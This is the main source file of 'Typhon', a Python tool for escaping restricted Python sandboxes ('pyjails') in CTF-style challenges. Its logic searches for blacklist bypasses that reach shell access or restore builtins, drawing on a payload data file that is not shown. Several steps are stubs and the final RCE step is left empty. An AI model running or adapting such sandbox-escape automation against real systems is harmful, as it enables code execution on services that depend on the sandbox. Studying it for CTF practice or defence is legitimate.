# This code is the main file of the Typhon package.
# It is emphasized again that the code is only for educational purposes 
# (like in CTFs) and should not be used for any malicious purposes.
# The code is maintained on github. If any bugs found or you have any
# suggestions, please raise an issue or pull request on the github 
# repository https://github.com/LamentXU123/Typhon.
# If you have any questions, please feel free to contact me.
# Weilin Du <1372449351@qq.com>, 2025.

import json
import logging

from typing import Any, Dict

# need to be set before other imports
log_level_ = 'INFO'
logging.basicConfig(level=log_level_, format='%(levelname)s %(message)s') # changable in bypass()
logger = logging.getLogger(__name__)

from utils import *

# The RCE data including RCE functions and their parameters.
RCE_data = json.load(open('RCE_data.json', 'r'))
BANNER = r'''
    .-')          _                 
   (`_^ (    .----`/                Typhon: a pyjail bypassing tool
    ` )  \_/`   __/     __,    
    __{   |`  __/      /_/     [Version]: v0.1
   / _{    \__/ '--.  //       [Github]: https://github.com/LamentXU123/Typhon
   \_> \_\  >__/    \((        [Slogan]: No jail is safe
        _/ /` _\_   |))
'''

def bypass(cmd: str,
           local_scope: Dict[str, Any] = 
           {i: getattr(__builtins__, i) for i in dir(__builtins__)},
           banned_chr: list = [], banned_ast: list[ast.AST] = [],
           banned_audithook: list[str] = [],
           max_length: int = None,
           allow_unicode_bypass: bool = False,
           depth: int = 10,
           log_level: str = 'INFO') -> None:
    '''
    This is the main function of the Typhon package.

    :param cmd: is the command to be executed.
    :param local_scope: is a list of local variables in the sandbox environment.
    :param banned_chr: is a list of blacklisted characters.
    :param banned_ast: is a list of banned AST.
    :param banned_audithook: is a list of banned audithook.
    :param allow_unicode_bypass: if unicode bypasses are allowed.
    :param depth: is the depth that combined bypassing being generarted
    :param log_level: is the logging level, default is INFO, change it to
    DEBUG for more details.
    '''
    print(BANNER)
    global achivements, log_level_
    log_level_ = log_level.upper()
    logger.setLevel(log_level_)
    achivements = {} # The progress we've gone so far. Being output in the end.
    original_scope = deepcopy(local_scope)
    # changes in local scope comparing to standard builtins
    change_in_builtins = [i for i in local_scope if i in dir(builtins)]
    if local_scope == {}:
        # If the local scope is not specified, raise a warning.
        logger.warning('[*] local scope not specified, use default local scope.')

    # Step1: Analyze and tag the local scope
    if '__builtins__' not in local_scope:
        local_scope['__builtins__'] = __builtins__
    # not using | for backward compatibility
    local_scope = merge_dicts(local_scope['__builtins__'], local_scope)
    tagged_scope = tag_scope(local_scope, change_in_builtins)
    all_objects = [i[0] for i in tagged_scope.values()]
    # check if we got an UNKNOWN tag
    for i in tagged_scope:
        if tagged_scope[i][0] == 'UNKNOWN':
            logger.warning('[!] Unknown object: %s', tagged_scope[i][0])
    logger.debug('[*] tagged scope: %s', tagged_scope)
    tags = [i[1] for i in tagged_scope.values()]

    # Step2: Try to exec directly with simple paths
    simple_path = filter_path_list(RCE_data['directly_getshell'], tagged_scope)
    if simple_path:
        logger.info('[*] %d paths found to directly getshell. \
Try to bypass blacklist with them. Please be paitent.', len(simple_path))
        logger.debug('[*] simple paths: %s', str(simple_path))
        _ = try_bypasses(simple_path, banned_chr, banned_ast, max_length, allow_unicode_bypass, all_objects)
        if _:
            logger.info('[+] directly getshell success. %d payload(s) in total.', len(_))
            logger.debug('[*] payloads to directly getshell: ')
            logger.debug(_)
            logger.info('[+] You now can use this payload to getshell directly with proper input.')
            achivements['directly input bypass'] = [_[0], len(_)]
            bypasses_output(_[0])
        else:
            logger.info('[-] no way to bypass blacklist to directly getshell.')
    else:
        logger.info('[-] no paths found to directly getshell.')

    # Step2: Try to find generators

    # Step3: Try to restore type

    # Step4: Try to restore object

    # Step5: Restore builtins (if possible)
    if 'BUILTINS_SET' in tags: # full lovely builtins set ;)
        logger.info('[*] __builitins__ not deleted, and every builtin is available.')
    elif 'BUILTINS_SET_CHANGED' in tags: # some thing was missing
        logger.info('[*] builitins not fully available (%d is missing)\
in the namespace, try to restore them.',
                    len(change_in_builtins))
        builtin_path = filter_path_list(RCE_data['restore_builtins_in_current_ns'], tagged_scope)
        if builtin_path:
            logger.info('[*] %d paths found to restore builtins. \
Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
            logger.debug('[*] restore paths: %s', str(builtin_path))
            _ = try_bypasses(builtin_path, banned_chr, banned_ast, max_length, allow_unicode_bypass, all_objects)
            if _:
                logger.info('[+] builtins restored. %d payload(s) in total.', len(_))
                logger.debug('[*] payloads to restore builtins: ')
                logger.debug(_)
                is_builtin_dict_found, is_builtin_module_found = False, False
                for i in _:
                    try:
                        if (eval(i) == __builtins__ 
                            and not is_builtin_dict_found 
                            and type(eval(i, original_scope)) == dict):
                            logger.info('[*] Using %s as the restored builtins dict.', i)
                            tagged_scope[i] = [eval(i), 'BUILTINS_SET']
                            achivements['builtins set'] = [_[0], len(_)]
                            tags.append('BUILTINS_SET')
                            is_builtin_dict_found = True
                        elif (eval(i) == builtins 
                              and not is_builtin_module_found
                              and type(eval(i, original_scope)) == ModuleType):
                            logger.info('[*] Using %s as the restored builtins module.', i)
                            tagged_scope[i] = [eval(i), 'MOUDLE_BUILTINS']
                            achivements['builtins module'] = [_[0], len(_)]
                            tags.append('MOUDLE_BUILTINS')
                            is_builtin_module_found = True
                    except: pass
            else:
                logger.info('[-] no way to find a bypass method to restore builtins.')
        else:
            logger.info('[-] no paths found to restore builtins.')
    else:
        logger.info('[*] __builtins__ in this namespace is deleted, no way to restore it.')

    # Step6: Try to restore __builtins__ in other namespaces (if possible)

    if 'BUILTINS_SET' not in tags and 'MOUDLE_BUILTINS' not in tags:
        logger.info('[*] __builtins__ not restored or deleted, try to find in other namespaces.')
        builtin_path = filter_path_list(RCE_data['restore_builtins_in_other_ns'], tagged_scope)
        if builtin_path:
            logger.info('[*] %d paths found to restore builtins in other namespaces. \
Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
            logger.debug('[*] restore paths: %s', str(builtin_path))
            _ = try_bypasses(builtin_path, banned_chr, banned_ast, max_length, allow_unicode_bypass, all_objects)
            if _:
                logger.info('[+] builtins restored in other namespaces. %d payload(s) in total.', len(_))
                logger.debug('[*] payloads to restore builtins in other namespaces: ')
                logger.debug(_)
                is_builtin_dict_found, is_builtin_module_found = False, False
                for i in _:
                    try:
                        if (eval(i) == __builtins__ 
                            and not is_builtin_dict_found 
                            and type(eval(i, original_scope)) == dict):
                            logger.info('[*] Using %s as the restored builtins dict.', i)
                            tagged_scope[i] = [eval(i), 'BUILTINS_SET']
                            tags.append('BUILTINS_SET')
                            achivements['builtins set'] = [_[0], len(_)]
                            is_builtin_dict_found = True
                        elif (eval(i) == builtins 
                              and not is_builtin_module_found
                              and type(eval(i, original_scope)) == ModuleType):
                            logger.info('[*] Using %s as the restored builtins module.', i)
                            tagged_scope[i] = [eval(i), 'MOUDLE_BUILTINS']
                            tags.append('MOUDLE_BUILTINS')
                            achivements['builtins module'] = [_[0], len(_)]
                            is_builtin_module_found = True
                    except: pass
            else:
                logger.info('[-] no way to find a bypass method to restore builtins in other namespaces.')
        else:
            logger.info('[-] no paths found to restore builtins in other namespaces.')

    # Step7: Try to get object

    # ....

    # Final Step: (Oh my lord, finally...) Try to RCE